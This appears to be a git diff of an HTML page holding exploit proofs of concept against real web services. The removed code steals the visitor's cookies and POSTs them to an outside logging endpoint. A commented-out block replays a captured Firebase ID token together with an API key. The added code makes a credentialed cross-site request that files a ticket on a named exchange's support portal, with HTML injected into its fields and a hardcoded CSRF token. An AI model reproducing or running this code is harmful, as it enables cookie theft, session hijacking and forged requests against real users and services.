@@ -1,89 +1,38 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      // Collect cookies from the document
-      const cookies = document.cookie;
-
-      // Additional metadata (e.g., custom text or context)
-      const metadata = {
-        message: "This is a test for CORS or XSS cookie vulnerability.",
-        timestamp: new Date().toISOString(),
-        customText: "Cookies have been captured from the victim's browser.",
-      };
-
-      // Construct the data payload
-      const payload = {
-        cookies: cookies || "No cookies found",
-        metadata: metadata,
-      };
-
-      // Send cookies and metadata to your server
-      fetch("https://varad4-0-4.github.io/covid19partnersplatform-dev/log", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload),
-      }).then(response => {
-        console.log("Payload sent successfully!");
-      }).catch(err => {
-        console.error("Error sending payload:", err);
-      });
-    </script>
-  </body>
-</html>
-
-
-
-<!-- <!DOCTYPE html>
-<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>CORS Exploit Demo</h1>
-    <p id="result">Fetching data...</p>
+    <h1>Exploit PoC</h1>
+    <button id="exploit">Exploit</button>
+    <pre id="response"></pre>
+
     <script>
-        // Define the API endpoint and payload
-        const apiEndpoint = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyC7J-OjmaQ6igkRmD5KNq2ZjbBDNgVNcIg";
-        const payload = {
-            idToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkyODg2OGRjNDRlYTZhOThjODhiMzkzZDM2NDQ1MTM2NWViYjMwZDgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcm9ib3NoYWRvdy1uZXR3b3JrLXNjYW5uZXIiLCJhdWQiOiJyb2Jvc2hhZG93LW5ldHdvcmstc2Nhbm5lciIsImF1dGhfdGltZSI6MTczMjIwNjY0OSwidXNlcl9pZCI6IkRRQk5Ib25NaWFiSFcyNG15Y1FvRFNvamk3MzIiLCJzdWIiOiJEUUJOSG9uTWlhYkhXMjRteWNRb0RTb2ppNzMyIiwiaWF0IjoxNzMyMjA2NjQ5LCJleHAiOjE3MzIyMTAyNDksImVtYWlsIjoidGVzdGluZ0Byb2Jvc2hhZG93LmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJ0ZXN0aW5nQHJvYm9zaGFkb3cuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.fH-Lz921t5XQDGcVxnFdqX_KkyzXOKQak1KYsEkTWMPC-Fv48MC4rVF4Imju8sEluthvebttL9Bbu5bTtqosToMeWcyi1bYtpkALHNyQIWdKOTRQzx2TjrauTnCvIg8pTQwCwk0do-sLf4Pgr6KsFYmSL4IMpVOjuHRsFnS5at0xANKPAKyC7-Bj4HzIMkBEd5SgcgIs3rngO39gtpa4IV1p1KjInC4eIwx95mLi49Gl-5KfT-SUwygIEDA7K_1NZbnOq423-TNSgEvaoavHOE1ccixjgI1SrbxDSeem_6jBnkWv8MGqa_Cljzj_vVJ4Dfc2WhN9BLdS3omd87E5_A"
-            // Replace with the victim's token
-        };
-
-        // Function to fetch data
-        async function fetchData() {
-            try {
-                const response = await fetch(apiEndpoint, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Client-Version": "Firefox/JsCore/9.23.0/FirebaseCore-web",
-                        "X-Firebase-Gmpid": "1:23092714539:web:301a575dc5381b26689e6e",
-                    },
-                    body: JSON.stringify(payload),
-                });
-
-                // Check if the response is successful
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
-
-                // Parse and display the response
-                const data = await response.json();
-                console.log("Fetched Data:", data);
-                document.getElementById("result").textContent = JSON.stringify(data, null, 2);
-            } catch (error) {
-                console.error("Error fetching data:", error);
-                document.getElementById("result").textContent = `Error: ${error.message}`;
-            }
-        }
-
-        // Trigger the fetch on page load
-        fetchData();
+        document.getElementById("exploit").addEventListener("click", () => {
+            fetch("https://support.bitexenglobal.com/portal/api/tickets?portalId=edbsnec74a7af888c57f616ce2c38590753254077661132ba79326c1f0fd19db2fcc9", {
+                method: "POST",
+                credentials: "include", // Send cookies along with the request
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Zcsrf-Token": "crmcsrfparam=408820809d0e1ee701a9e4f2d85df8d5a7c8a3ec2826e0b6bb6bab54bcfe5055ff6d93a93d87f48dc94ccb30b90a2fca7dfc0e8749a53c4a000c3b0f63d53dc0"
+                },
+                body: JSON.stringify({
+                    departmentId: "484276000450140029",
+                    layoutId: "484276000450354782",
+                    subject: "<h1>dd</h1>",
+                    category: "Alım/Satım İşlemleri",
+                    subCategory: "Alış Satış Fiyat Farkı",
+                    phone: "<h1>dd</h1>",
+                    description: "mm"
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("response").textContent = data;
+            })
+            .catch(err => console.error("Request failed", err));
+        });
     </script>
 </body>
-</html> -->
+</html>
